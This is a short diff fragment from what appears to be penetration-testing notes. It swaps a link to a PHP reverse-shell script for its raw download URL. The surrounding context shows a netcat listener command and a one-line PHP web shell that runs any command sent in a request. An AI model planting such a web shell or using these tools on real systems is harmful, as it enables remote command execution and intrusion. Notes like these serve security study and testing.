@@ -17,7 +17,7 @@ rlwrap nc -lvnp
 https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 
 #### PHP
-https://github.com/Wh1ter0sEo4/reverse_shell_php/blob/main/reverse_shell.php
+https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/reverse_shell.php
 
 ```php
 <?php system($_REQUEST["cmd"]); ?>
